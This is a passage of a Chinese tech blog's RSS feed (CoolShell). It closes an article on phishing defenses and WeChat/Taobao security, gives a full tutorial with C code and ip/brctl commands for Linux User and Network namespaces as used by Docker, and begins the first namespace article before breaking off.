<p>更狠的是就算你打开的是一个正确的URL，你依然可能被中间人攻击。尤其是这个网站使用了明文的HTTP协议，而你又喜欢蹭那些免费的WiFi，于是很容易给把服务器返回给你的网页中做修改，比如，修改网页中login表单或是支付表单提交的网站（想想天朝的网络运营商给你访问的正常的网页弹广告这事吧）</p>
<p>关于DNS劫持，有些人觉得这事可能遇不上，因为这是一个全网的问题，如果你有这样的想法你就错了。还是那样，你爱占便宜，蹭上那些没有密码的WiFi，你完不知道，你连上去的那个WiFi会设置什么样的DNS服务器，你输入了www.taobao.com，但你打开的网站根本就是不是淘定，而是一个钓鱼网站。你会知道你打开的是错的了么？基本不可能。所以，安全点的网站都是要用HTTPS，但是还是那句话，iPhone的Safari并不会提示你打开网站的SSL证书合不合法（事实上，在手机上的很多浏览器都不会这提示，只有Chrome会）。</p>
<p>关于攻击的方式我不想讲太多，还有很多高级+猥琐的方式我也不是完全知道，知道了我也不说，不然，教人犯罪了。</p>
<p>关于从Web端唤起APP是和，APP唤醒APP的攻击方式基本一样。我就不说了。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%8E%E4%B9%88%E9%98%B2%E8%8C%83%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB"></span>怎么防范钓鱼式攻击<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们要知道，钓鱼式攻击是一件非常难搞的事。要搞定这个事，一般来说需要四个方面：<strong>立法层面</strong>、<strong>用户培训层面</strong>、<strong>宣传层面</strong>、与<strong>技术保全措施层面</strong>。</p>
<p><strong>教育方面</strong></p>
<p>打击网钓的策略之一，是试着培养人们识别网钓，并教导怎样处理这些问题。只需要稍稍修改人们浏览习惯的方式，很多问题都可以避免。随着人们越来越认识到网钓者所使用的社会工程学技俩，传统的网钓欺诈技术可能在未来过时。</p>
<ul>
<li>对别人发来的链接要小心，尤其是让你输入机密信息的链接要小心检查。</li>
</ul>
<ul>
<li>到正规的地方买手机，不要贪图小便宜。旧手机在卖前要“物理删除”数据。</li>
</ul>
<ul>
<li>不要对手机越狱，不要root。</li>
</ul>
<ul>
<li>不要从非信任的地方下载软件。</li>
</ul>
<ul>
<li>要小心免费的WiFi。</li>
</ul>
<ul>
<li>输入机密数据的时候一定要小心检查。</li>
</ul>
<ul>
<li>多依赖一些不同的安全体系，比如：网上支付不要只依赖支付宝，尽量使用信用卡（信用卡千万不要设密码），这样就算是被钓鱼了，你还有一个银行安全的缓冲地带——可以不承认交易。</li>
</ul>
<ul>
<li>现在使用手机的频率越来越高，所以，我非常建议你使用更为安全的iPhone手机，一定要打开“查找我的iPhone”功能，然后设上开机密码。iPhone手机可以做到手机丢失了别人都无法使用，包括刷机都刷不了（iOS7以上版本）</li>
</ul>
<ul>
<li>对于一些关键网站，开启两步验证，这样就算你的用户名和密码被钓走了，还有一个动态手机口令做为登录的关卡。</li>
</ul>
<p><strong>技术方面</strong></p>
<ul>
<li>利用SSL证书来保证从浏览器到网站的访问是现在采用比较多的方式，也是在理论上可行的方式。现代的浏览器都会在URL上放上一个锁的标志，对于EV证书，你会看到浏览器的URL是绿色的（很容易分辨）</li>
</ul>
<ul>
<li>另外，像firefox浏览器有一个petname的插件，你可以为你常上的网站设置一些标签。这样，当你打开钓鱼网站的时候，你会发现这些标签没有显示出来，那就有问题了。</li>
</ul>
<ul>
<li>关于SSL的CA认证机构，你需要管理好你浏览的那些根证书，有些根证书你需要删掉。</li>
</ul>
<ul>
<li>还有一种打击网钓的流行作法是保持一份已知的网钓网站名单，并随时更新。比如<a href="https://www.phishtank.com/" target="_blank">PhishTank</a>，以及<a href="http://www.apac.cn" target="_blank">中国防钓鱼网站联盟</a>。</li>
</ul>
<ul>
<li>增加式登录方式。这种方式被美国银行采用，就是说，你可以上传一个你自己知道的图片，而当你打开登录页面里时，输入了自己的用户名后，你会看到你设置的这个图片被显示出来。如果没有或是显示错了，表示你打开的是钓鱼网站。</li>
</ul>
<ul>
<li>两步验证，通过用户自设密码+手机动态口令登录（好些网站都在使用Google Authenticator的方式，这有点像公司VPN的动态口令）。</li>
</ul>
<p>上述都是PC Web上的防范，然而我们的手机移动端做的并不够好，移动端的安全还是要加油。</p>
<p><strong>安全风控方面</strong></p>
<p><strong>什么叫安全风控，说白了就是拿钱出来赔偿给被骗的用户，大家相信我，这个事情在基本上所有的公司都会做的</strong>，也就是说，无论你怎么做安全也无法保证绝对的安全，你只能缓解或是降低用户被骗的数量或概率。所以，几乎所有的公司都会有一笔钱专门用来赔偿。</p>
<p>在西方国家，用户体验很好，我说一个故事，我有一个妹妹在英国，有一天她到ATM上取钱，取完钱后忘了把卡取出，结果后面的人把她的卡里的钱取走了，于是她报了警，等警察做完笔录后，她给银行的客服打了个电话说明了情况，本想冻结银行卡的，但是银行方面二话不说就赔偿了她所有的损失。为什么英国的巴克莱银行这么痛快，是因为他们有风控基金，专门用来处理这样的事的。</p>
<p>在中国，其实银行和一些大的公司都有这笔安全风控基金，但是，要你非常坚持不懈地申诉，他们才会赔给你，而且还不是全部。要全部的话，我估计你要做一个“刁民”，否则欺负你，没道理。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%92%8C%E6%B7%98%E5%AE%9D"></span>关于微信和淘宝<span class="ez-toc-section-end"></span>
</h4>
<p>微信和淘宝到底是谁先屏蔽谁我并不关心，这里面的商业利益我也不关心，微信是不是支持卖东西我也不关心。我关心的是寒冬文章中所说的微信上有淘宝钓鱼的安全问题。</p>
<p>从技术上来说，我觉得要微信和淘宝一起干这事，单方都不行，需要两边的安全专家一起讨论（如果需要，我可以帮你们约）。我这里给一个可能很不成熟的方案，算是抛砖引玉（我不考虑你们之间的商业竞争，我只从用户的角度出发，客户第一）：</p>
<blockquote>
<p><strong>我觉得，从业务上来说，淘宝可以在微信上有一个官方的商城。而淘宝的商家，需要取得微信的认证后入住，才能分享相关的商品或店家链接，对此，商家入住，我觉得可通过微信的服务账号与淘宝的商家后台集成可以做到。</strong></p>
<p><strong>然后，商家也好，买家也好，他们分享商品只能通过微信官方的商城或是商家的服务账号分享出去，而分享出去的商品信息可以是一个比较unique的形式（比如有一个不能伪造的官方认证的标签），而用户的支付可以通过内置的微信支付也可以通过内置的支付宝（通过唤起App并不是一个好的方式，还是应该你们在服务端进行相互的通信）。</strong></p>
<p><strong>然后微信和淘宝双方通过宣传手段告诉全社会，微信里的商品什么才是正规的，才不是钓鱼的，并给教育用户更为安全地使用手机。</strong></p>
</blockquote>
<p>P.S. 我虽然这么说，但从我个人来说，我非常理解微信为了让用户有很好的体验而不让微信成为一个四处都是营销商品的地方。所以，我从个人来说，希望微信不要成为一个商家的营销地。另外，我也知道阿里对移动端的看重，所以，上述的方案虽然对用户体验和安全都比较好，但是从目前商业利益的情况看来基本无法实现。不过我这里也只是抛砖引玉了。</p>
<p>面对安全和用户这两个事，<strong>你们两个中国最大的互联网公司，应该带头做好榜样，你们都是不缺钱的公司，应该更多的承担起社会的责任，真正为用户做点什么，而不是整天想着流量入口，互相屏蔽，互相指责，想着自己能有多少用户，这TMD太LOW了，和你们的地位完全不符。所以，从站在用户的角度上来说，我希望微信和淘宝都能站在用户的角度上思考问题，一起合作来真正的为用户更好的服务。</strong></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2015-04-14T08:13:23+08:00</pubDate>
<guid>https://coolshell.cn/articles/17066.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Docker基础技术：Linux Namespace（下） ]]></title>
<link>https://coolshell.cn/articles/17029.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >在 <strong><a title="Docker基础技术：Linux Namespace（上）" href="https://coolshell.cn/articles/17010.html" target="_blank" rel="noopener noreferrer">Docker基础技术：Linux Namespace（上篇）</a></strong>中我们了解了，UTD、IPC、PID、Mount 四个namespace，我们模仿Docker做了一个相当相当山寨的镜像。在这一篇中，主要想向大家介绍Linux的User和Network的Namespace。</p>
<p>好，下面我们就介绍一下还剩下的这两个Namespace。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#User_Namespace" title="User Namespace">User Namespace</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Network_Namespace" title="Network Namespace">Network Namespace</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Namespace%E6%96%87%E4%BB%B6" title="Namespace文件">Namespace文件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3" title="参考文档">参考文档</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="User_Namespace"></span>User Namespace<span class="ez-toc-section-end"></span>
</h4>
<p>User Namespace主要是用了CLONE_NEWUSER的参数。使用了这个参数后，内部看到的UID和GID已经与外部不同了，默认显示为65534。那是因为容器找不到其真正的UID所以，设置上了最大的UID（其设置定义在/proc/sys/kernel/overflowuid）。</p>
<p>要把容器中的uid和真实系统的uid给映射在一起，需要修改 <strong>/proc/&lt;pid&gt;/uid_map</strong> 和 <strong>/proc/&lt;pid&gt;/gid_map</strong> 这两个文件。这两个文件的格式为：</p>
<p><code><code></code></code><strong>ID-inside-ns ID-outside-ns length</strong></p>
<p>其中：</p>
<p><span id="more-17029"></span></p>
<ul>
<li>第一个字段ID-inside-ns表示在容器显示的UID或GID，</li>
<li>第二个字段ID-outside-ns表示容器外映射的真实的UID或GID。</li>
<li>第三个字段表示映射的范围，一般填1，表示一一对应。</li>
</ul>
<p>比如，把真实的uid=1000映射成容器内的uid=0</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ cat /proc/2465/uid_map
         0       1000          1</pre>
<p>再比如下面的示例：表示把namespace内部从0开始的uid映射到外部从0开始的uid，其最大范围是无符号32位整形</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ cat /proc/$$/uid_map
         0          0          4294967295</pre>
<p>另外，需要注意的是：</p>
<ul>
<li>写这两个文件的进程需要这个namespace中的CAP_SETUID (CAP_SETGID)权限（可参看<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener noreferrer">Capabilities</a>）</li>
<li>写入的进程必须是此user namespace的父或子的user namespace进程。</li>
<li>另外需要满如下条件之一：1）父进程将effective uid/gid映射到子进程的user namespace中，2）父进程如果有CAP_SETUID/CAP_SETGID权限，那么它将可以映射到父进程中的任一uid/gid。</li>
</ul>
<p>这些规则看着都烦，我们来看程序吧（下面的程序有点长，但是非常简单，如果你读过《Unix网络编程》上卷，你应该可以看懂）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/mount.h&gt;
#include &lt;sys/capability.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sched.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;

#define STACK_SIZE (1024 * 1024)

static char container_stack[STACK_SIZE];
char* const container_args[] = {
    "/bin/bash",
    NULL
};

int pipefd[2];

void set_map(char* file, int inside_id, int outside_id, int len) {
    FILE* mapfd = fopen(file, "w");
    if (NULL == mapfd) {
        perror("open file error");
        return;
    }
    fprintf(mapfd, "%d %d %d", inside_id, outside_id, len);
    fclose(mapfd);
}

void set_uid_map(pid_t pid, int inside_id, int outside_id, int len) {
    char file[256];
    sprintf(file, "/proc/%d/uid_map", pid);
    set_map(file, inside_id, outside_id, len);
}

void set_gid_map(pid_t pid, int inside_id, int outside_id, int len) {
    char file[256];
    sprintf(file, "/proc/%d/gid_map", pid);
    set_map(file, inside_id, outside_id, len);
}

int container_main(void* arg)
{

    printf("Container [%5d] - inside the container!\n", getpid());

    printf("Container: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\n",
            (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid());

    /* 等待父进程通知后再往下执行（进程间的同步） */
    char ch;
    close(pipefd[1]);
    read(pipefd[0], &amp;ch, 1);

    printf("Container [%5d] - setup hostname!\n", getpid());
    //set hostname
    sethostname("container",10);

    //remount "/proc" to make sure the "top" and "ps" show container's information
    mount("proc", "/proc", "proc", 0, NULL);

    execv(container_args[0], container_args);
    printf("Something's wrong!\n");
    return 1;
}

int main()
{
    const int gid=getgid(), uid=getuid();

    printf("Parent: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\n",
            (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid());

    pipe(pipefd);
 
    printf("Parent [%5d] - start a container!\n", getpid());

    int container_pid = clone(container_main, container_stack+STACK_SIZE, 
            CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | SIGCHLD, NULL);

    
    printf("Parent [%5d] - Container [%5d]!\n", getpid(), container_pid);

    //To map the uid/gid, 
    //   we need edit the /proc/PID/uid_map (or /proc/PID/gid_map) in parent
    //The file format is
    //   ID-inside-ns   ID-outside-ns   length
    //if no mapping, 
    //   the uid will be taken from /proc/sys/kernel/overflowuid
    //   the gid will be taken from /proc/sys/kernel/overflowgid
    set_uid_map(container_pid, 0, uid, 1);
    set_gid_map(container_pid, 0, gid, 1);

    printf("Parent [%5d] - user/group mapping done!\n", getpid());

    /* 通知子进程 */
    close(pipefd[1]);

    waitpid(container_pid, NULL, 0);
    printf("Parent - container stopped!\n");
    return 0;
}</pre>
<p>上面的程序，我们用了一个pipe来对父子进程进行同步，为什么要这样做？因为子进程中有一个execv的系统调用，这个系统调用会把当前子进程的进程空间给全部覆盖掉，我们希望在execv之前就做好user namespace的uid/gid的映射，这样，execv运行的/bin/bash就会因为我们设置了uid为0的inside-uid而变成#号的提示符。</p>
<p>整个程序的运行效果如下：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="eb8388838e85ab9e899e859f9e">[email protected]</a>:~$ id
uid=1000(hchen) gid=1000(hchen) groups=1000(hchen)

<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="10787378757e506572657e6465">[email protected]</a>:~$ ./user #&lt;--以hchen用户运行
Parent: eUID = 1000;  eGID = 1000, UID=1000, GID=1000 
Parent [ 3262] - start a container!
Parent [ 3262] - Container [ 3263]!
Parent [ 3262] - user/group mapping done!
Container [    1] - inside the container!
Container: eUID = 0;  eGID = 0, UID=0, GID=0 #&lt;---Container里的UID/GID都为0了
Container [    1] - setup hostname!

<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="52203d3d2612313d3c26333b3c3720">[email protected]</a>:~# id #&lt;----我们可以看到容器里的用户和命令行提示符是root用户了
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)</pre>
<p>虽然容器里是root，但其实这个容器的/bin/bash进程是以一个普通用户hchen来运行的。这样一来，我们容器的安全性会得到提高。</p>
<p>我们注意到，User Namespace是以普通用户运行，但是别的Namespace需要root权限，那么，如果我要同时使用多个Namespace，该怎么办呢？一般来说，我们先用一般用户创建User Namespace，然后把这个一般用户映射成root，在容器内用root来创建其它的Namesapce。</p>
<h4>
<span class="ez-toc-section" id="Network_Namespace"></span>Network Namespace<span class="ez-toc-section-end"></span>
</h4>
<p>Network的Namespace比较啰嗦。在Linux下，我们一般用ip命令创建Network Namespace（Docker的源码中，它没有用ip命令，而是自己实现了ip命令内的一些功能——是用了Raw Socket发些“奇怪”的数据，呵呵）。这里，我还是用ip命令讲解一下。</p>
<p>首先，我们先看个图，下面这个图基本上就是Docker在宿主机上的网络示意图（其中的物理网卡并不准确，因为docker可能会运行在一个VM中，所以，这里所谓的“物理网卡”其实也就是一个有可以路由的IP的网卡）</p>
<p><img alt="image placeholder" ></p>
<p>上图中，Docker使用了一个私有网段，172.40.1.0，docker还可能会使用10.0.0.0和192.168.0.0这两个私有网段，关键看你的路由表中是否配置了，如果没有配置，就会使用，如果你的路由表配置了所有私有网段，那么docker启动时就会出错了。</p>
<p>当你启动一个Docker容器后，你可以使用ip link show或ip addr show来查看当前宿主机的网络情况（我们可以看到有一个docker0，还有一个veth22a38e6的虚拟网卡——给容器用的）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-highlight="6,8"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a3cbc0cbc6cde3d6c1d6cdd7d6">[email protected]</a>:~$ ip link show
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state ... 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc ...
    link/ether 00:0c:29:b7:67:7d brd ff:ff:ff:ff:ff:ff
3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 ...
    link/ether 56:84:7a:fe:97:99 brd ff:ff:ff:ff:ff:ff
5: veth22a38e6: &lt;BROADCAST,UP,LOWER_UP&gt; mtu 1500 qdisc ...
    link/ether 8e:30:2a:ac:8c:d1 brd ff:ff:ff:ff:ff:ff</pre>
<p>那么，要做成这个样子应该怎么办呢？我们来看一组命令：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">## 首先，我们先增加一个网桥lxcbr0，模仿docker0
brctl addbr lxcbr0
brctl stp lxcbr0 off
ifconfig lxcbr0 192.168.10.1/24 up #为网桥设置IP地址

## 接下来，我们要创建一个network namespace - ns1

# 增加一个namesapce 命令为 ns1 （使用ip netns add命令）
ip netns add ns1 

# 激活namespace中的loopback，即127.0.0.1（使用ip netns exec ns1来操作ns1中的命令）
ip netns exec ns1   ip link set dev lo up 

## 然后，我们需要增加一对虚拟网卡

# 增加一个pair虚拟网卡，注意其中的veth类型，其中一个网卡要按进容器中
ip link add veth-ns1 type veth peer name lxcbr0.1

# 把 veth-ns1 按到namespace ns1中，这样容器中就会有一个新的网卡了
ip link set veth-ns1 netns ns1

# 把容器里的 veth-ns1改名为 eth0 （容器外会冲突，容器内就不会了）
ip netns exec ns1  ip link set dev veth-ns1 name eth0 

# 为容器中的网卡分配一个IP地址，并激活它
ip netns exec ns1 ifconfig eth0 192.168.10.11/24 up


# 上面我们把veth-ns1这个网卡按到了容器中，然后我们要把lxcbr0.1添加上网桥上
brctl addif lxcbr0 lxcbr0.1

# 为容器增加一个路由规则，让容器可以访问外面的网络
ip netns exec ns1     ip route add default via 192.168.10.1

# 在/etc/netns下创建network namespce名称为ns1的目录，
# 然后为这个namespace设置resolv.conf，这样，容器内就可以访问域名了
mkdir -p /etc/netns/ns1
echo "nameserver 8.8.8.8" &gt; /etc/netns/ns1/resolv.conf</pre>
<p>上面基本上就是docker网络的原理了，只不过，</p>
<ul>
<li>Docker的resolv.conf没有用这样的方式，而是用了<a title="Docker基础技术：Linux Namespace（上）" href="https://coolshell.cn/articles/17010.html" target="_blank" rel="noopener noreferrer">上篇中的Mount Namesapce的那种方式</a>
</li>
<li>另外，docker是用进程的PID来做Network Namespace的名称的。</li>
</ul>
<p>了解了这些后，你甚至可以为正在运行的docker容器增加一个新的网卡：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">ip link add peerA type veth peer name peerB 
brctl addif docker0 peerA 
ip link set peerA up 
ip link set peerB netns ${container-pid} 
ip netns exec ${container-pid} ip link set dev peerB name eth1 
ip netns exec ${container-pid} ip link set eth1 up ; 
ip netns exec ${container-pid} ip addr add ${ROUTEABLE_IP} dev eth1 ;</pre>
<p>上面的示例是我们为正在运行的docker容器，增加一个eth1的网卡，并给了一个静态的可被外部访问到的IP地址。</p>
<p>这个需要把外部的“物理网卡”配置成混杂模式，这样这个eth1网卡就会向外通过ARP协议发送自己的Mac地址，然后外部的交换机就会把到这个IP地址的包转到“物理网卡”上，因为是混杂模式，所以eth1就能收到相关的数据，一看，是自己的，那么就收到。这样，Docker容器的网络就和外部通了。</p>
<p>当然，无论是Docker的NAT方式，还是混杂模式都会有性能上的问题，NAT不用说了，存在一个转发的开销，混杂模式呢，网卡上收到的负载都会完全交给所有的虚拟网卡上，于是就算一个网卡上没有数据，但也会被其它网卡上的数据所影响。</p>
<p>这两种方式都不够完美，我们知道，真正解决这种网络问题需要使用VLAN技术，于是Google的同学们为Linux内核实现了一个<a href="https://lwn.net/Articles/620087/" target="_blank" rel="noopener noreferrer">IPVLAN的驱动</a>，这基本上就是为Docker量身定制的。</p>
<h4>
<span class="ez-toc-section" id="Namespace%E6%96%87%E4%BB%B6"></span>Namespace文件<span class="ez-toc-section-end"></span>
</h4>
<p>上面就是目前Linux Namespace的玩法。 现在，我来看一下其它的相关东西。</p>
<p>让我们运行一下上篇中的那个pid.mnt的程序（也就是PID Namespace中那个mount proc的程序），然后不要退出。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">$ sudo ./pid.mnt 
[sudo] password for hchen: 
Parent [ 4599] - start a container!
Container [    1] - inside the container!</pre>
<p>我们到另一个shell中查看一下父子进程的PID：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7c141f1419123c091e09120809">[email protected]</a>:~$ pstree -p 4599
pid.mnt(4599)───bash(4600)</pre>
<p>我们可以到proc下（/proc//ns）查看进程的各个namespace的id（内核版本需要3.8以上）。</p>
<p>下面是父进程的：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5d353e3538331d283f28332928">[email protected]</a>:~$ sudo ls -l /proc/4599/ns
total 0
lrwxrwxrwx 1 root root 0  4月  7 22:01 ipc -&gt; ipc:[4026531839]
lrwxrwxrwx 1 root root 0  4月  7 22:01 mnt -&gt; mnt:[4026531840]
lrwxrwxrwx 1 root root 0  4月  7 22:01 net -&gt; net:[4026531956]
lrwxrwxrwx 1 root root 0  4月  7 22:01 pid -&gt; pid:[4026531836]
lrwxrwxrwx 1 root root 0  4月  7 22:01 user -&gt; user:[4026531837]
lrwxrwxrwx 1 root root 0  4月  7 22:01 uts -&gt; uts:[4026531838]</pre>
<p>下面是子进程的：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d2bab1bab7bc92a7b0a7bca6a7">[email protected]</a>:~$ sudo ls -l /proc/4600/ns
total 0
lrwxrwxrwx 1 root root 0  4月  7 22:01 ipc -&gt; ipc:[4026531839]
lrwxrwxrwx 1 root root 0  4月  7 22:01 mnt -&gt; mnt:[4026532520]
lrwxrwxrwx 1 root root 0  4月  7 22:01 net -&gt; net:[4026531956]
lrwxrwxrwx 1 root root 0  4月  7 22:01 pid -&gt; pid:[4026532522]
lrwxrwxrwx 1 root root 0  4月  7 22:01 user -&gt; user:[4026531837]
lrwxrwxrwx 1 root root 0  4月  7 22:01 uts -&gt; uts:[4026532521]</pre>
<p>我们可以看到，其中的ipc，net，user是同一个ID，而mnt,pid,uts都是不一样的。如果两个进程指向的namespace编号相同，就说明他们在同一个namespace下，否则则在不同namespace里面。</p>
<p>这些文件还有另一个作用，那就是，一旦这些文件被打开，只要其fd被占用着，那么就算PID所属的所有进程都已经结束，创建的namespace也会一直存在。比如：我们可以通过：mount –bind /proc/4600/ns/uts ~/uts 来hold这个namespace。</p>
<p>另外，我们在上篇中讲过一个setns的系统调用，其函数声明如下：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int setns(int fd, int nstype);</pre>
<p>其中第一个参数就是一个fd，也就是一个open()系统调用打开了上述文件后返回的fd，比如：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">fd = open("/proc/4600/ns/nts", O_RDONLY);  // 获取namespace文件描述符
setns(fd, 0); // 加入新的namespace</pre>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"></span>参考文档<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li style="list-style-type: none;">
<ul>
<li><a href="https://lwn.net/Articles/531114/" target="_blank" rel="noopener noreferrer">Namespaces in operation</a></li>
<li><a href="http://man7.org/linux/man-pages/man7/namespaces.7.html" target="_blank" rel="noopener noreferrer">Linux Namespace Man Page</a></li>
<li><a href="http://crosbymichael.com/creating-containers-part-1.html" target="_blank" rel="noopener noreferrer">Creat Containers – Part 1</a></li>
<li><a href="https://blog.jtlebi.fr/2013/12/22/introduction-to-linux-namespaces-part-1-uts/" target="_blank" rel="noopener noreferrer">Introduction to Linux namespaces</a></li>
</ul>
</li>
</ul>
<p>（应网友card323加入）</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2015-04-16T10:19:23+08:00</pubDate>
<guid>https://coolshell.cn/articles/17029.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Docker基础技术：Linux Namespace（上） ]]></title>
<link>https://coolshell.cn/articles/17010.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >时下最热的技术莫过于Docker了，很多人都觉得Docker是个新技术，其实不然，Docker除了其编程语言用go比较新外，其实它还真不是个新东西，也就是个新瓶装旧酒的东西，所谓的The New “Old Stuff”。Docker和Docker衍生的东西用到了很多很酷的技术，我会用几篇 文章来把这些技术给大家做个介绍，希望通过这些文章大家可以自己打造一个山寨版的docker。</p>
<p>当然，文章的风格一定会尊重时下的“流行”——<strong>我们再也没有整块整块的时间去看书去专研，而我们只有看微博微信那样的碎片时间</strong>（那怕我们有整块的时间，也被那些在手机上的APP碎片化了）。所以，这些文章的风格必然坚持“马桶风格”（希望简单到占用你拉一泡屎就时间，而且你还不用动脑子，并能学到些东西）</p>
<p>废话少说，我们开始。先从Linux Namespace开始。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#_%E7%AE%80%E4%BB%8B" title=" 简介"> 简介</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#clone%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" title="clone()系统调用">clone()系统调用</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#UTS_Namespace" title="UTS Namespace">UTS Namespace</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#IPC_Namespace" title="IPC Namespace">IPC Namespace</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#PID_Namespace" title="PID Namespace">PID Namespace</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Mount_Namespace" title="Mount Namespace">Mount Namespace</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Docker%E7%9A%84_Mount_Namespace" title="Docker的 Mount Namespace">Docker的 Mount Namespace</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="_%E7%AE%80%E4%BB%8B"></span> 简介<span class="ez-toc-section-end"></span>
</h4>
<p>Linux Namespace是Linux提供的一种内核级别环境隔离的方法。不知道你是否还记得很早以前的Unix有一个叫chroot的系统调用（通过修改根目录把用户jail到一个特定目录下），chroot提供了一种简单的隔离模式：chroot内部的文件系统无法访问外部的内容。Linux Namespace在此基础上，提供了对UTS、IPC、mount、PID、network、User等的隔离机制。</p>
<p><span id="more-17010"></span></p>
<p>举个例子，我们都知道，Linux下的超级父亲进程的PID是1，所以，同chroot一样，如果我们可以把用户的进程空间jail到某个进程分支下，并像chroot那样让其下面的进程 看到的那个超级父进程的PID为1，于是就可以达到资源隔离的效果了（不同的PID namespace中的进程无法看到彼此）</p>
<p><b>Linux Namespace 有如下种类</b>，官方文档在这里《<a href="https://lwn.net/Articles/531114/" target="_blank" rel="noopener noreferrer">Namespace in Operation</a>》</p>
<table width="100%">
<thead>
<tr>
<th>分类</th>
<th>系统调用参数</th>
<th>相关内核版本</th>
</tr>
</thead>
<tbody>
<tr>
<td><b>Mount namespaces</b></td>
<td>CLONE_NEWNS</td>
<td><a href="https://lwn.net/2001/0301/a/namespaces.php3" target="_blank" rel="noopener noreferrer">Linux 2.4.19</a></td>
</tr>
<tr>
<td><b>UTS namespaces</b></td>
<td>CLONE_NEWUTS</td>
<td><a href="https://lwn.net/Articles/179345/" target="_blank" rel="noopener noreferrer">Linux 2.6.19</a></td>
</tr>
<tr>
<td><b>IPC namespaces</b></td>
<td>CLONE_NEWIPC</td>
